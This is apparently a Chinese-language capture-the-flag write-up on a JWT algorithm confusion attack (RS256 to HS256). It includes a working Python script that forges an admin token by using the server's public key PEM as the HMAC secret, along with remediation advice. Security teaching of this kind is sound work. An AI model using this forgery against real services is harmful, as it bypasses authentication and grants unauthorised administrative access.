# WriteUP - A04 Hard: JWT 算法混淆攻击 (RS256 → HS256)

## 密码学原理

### JWT 算法概述

JWT（JSON Web Token）由三部分组成：`Header.Payload.Signature`

**RS256（RSA + SHA-256）**：
- 非对称算法
- 使用**私钥**签名，**公钥**验证
- 公钥可以公开，私钥必须保密

**HS256（HMAC + SHA-256）**：
- 对称算法
- 使用**同一个密钥**进行签名和验证
- 密钥必须保密

### 算法混淆攻击 (Algorithm Confusion Attack)

当 JWT 库根据 Token Header 中的 `alg` 字段动态选择验证算法时，如果未正确区分密钥类型，可能导致严重漏洞：

**漏洞场景**：
1. 服务端同时支持 `RS256` 和 `HS256`
2. 当 `alg=RS256` 时，使用公钥验证 RSA 签名（正确）
3. 当 `alg=HS256` 时，**错误地使用公钥内容（PEM字符串）作为 HMAC 对称密钥**

**攻击原理**：
- 攻击者获取公钥（通过 `/.well-known/jwks.json`）
- 构造新 Token，Header 中 `alg` 改为 `HS256`
- 使用公钥内容作为 HMAC 密钥对 Token 签名
- 服务端用相同的公钥内容验证 HMAC，验证通过！

**根本原因**：
- 服务端未验证 `alg` 字段的合法性
- 不同类型的密钥（RSA公钥 vs HMAC密钥）被混用

## 逐步利用过程

### 步骤 1：获取公钥

访问 `/.well-known/jwks.json`：
```json
{
  "keys": [
    {
      "kty": "RSA",
      "n": "xT_1i...",
      "e": "AQAB",
      "kid": "key-2025"
    }
  ]
}
```

或者更直接地从 `/public.pem` 获取原始 PEM 格式公钥。

### 步骤 2：使用公钥 PEM 作为 HMAC 密钥

由于 PyJWT 等库会阻止使用 RSA 公钥作为 HMAC 密钥，我们需要**手动构造 JWT**。

### 步骤 3：构造伪造的 JWT

```python
import base64, json, hmac, hashlib

# 伪造 payload
payload = {"sub": "admin", "role": "admin"}

# 手动构造 Header 和 Payload 的 base64url
header = base64.urlsafe_b64encode(
    json.dumps({"alg": "HS256", "typ": "JWT", "kid": "key-2025"}).encode()
).rstrip(b'=')

payload_b64 = base64.urlsafe_b64encode(
    json.dumps(payload).encode()
).rstrip(b'=')

# 使用公钥 PEM 作为 HMAC 密钥计算签名
msg = header + b'.' + payload_b64
sig = base64.urlsafe_b64encode(
    hmac.new(public_pem, msg, hashlib.sha256).digest()
).rstrip(b'=')

token = (msg + b'.' + sig).decode('ascii')
```

### 步骤 4：发送伪造 Token 获取 Flag

```
GET /flag
Authorization: Bearer <伪造的token>
```

## Python 利用脚本

```python
import requests
import base64
import json
import hmac
import hashlib

TARGET = "http://localhost:8080"

# 1. 直接获取原始公钥 PEM
resp = requests.get(f"{TARGET}/public.pem")
public_pem = resp.content
print(f"[+] Got public key PEM ({len(public_pem)} bytes)")

# 2. 手动构造伪造的 admin JWT（HS256 + 公钥PEM作为HMAC密钥）
header = base64.urlsafe_b64encode(
    json.dumps({"alg": "HS256", "typ": "JWT", "kid": "key-2025"}).encode()
).rstrip(b'=')

payload = base64.urlsafe_b64encode(
    json.dumps({"sub": "admin", "role": "admin"}).encode()
).rstrip(b'=')

msg = header + b'.' + payload
sig = base64.urlsafe_b64encode(
    hmac.new(public_pem, msg, hashlib.sha256).digest()
).rstrip(b'=')

fake_token = (msg + b'.' + sig).decode('ascii')
print(f"[+] Forged JWT: {fake_token}")

# 3. 发送请求获取 flag
headers = {"Authorization": f"Bearer {fake_token}"}
flag_resp = requests.get(f"{TARGET}/flag", headers=headers)
print(flag_resp.text)
```

## 修复建议

1. **严格校验 alg 字段**
   ```python
   allowed_algs = ['RS256']
   if header['alg'] not in allowed_algs:
       raise ValueError("Unsupported algorithm")
   ```

2. **固定使用预期的算法**
   - 不要根据客户端提供的 `alg` 动态选择算法
   - 服务端硬编码 `algorithm='RS256'`

3. **密钥隔离**
   - RSA 公钥/私钥和 HMAC 密钥必须完全隔离
   - 永远不要将公钥内容作为对称密钥使用

4. **使用白名单机制**
   ```python
   jwt.decode(token, key, algorithms=['RS256'])  # 明确指定允许算法
   ```

5. **定期轮换密钥**
   - 减少密钥泄露后的影响时间窗口
   - 实施 Key ID (kid) 管理和轮换策略
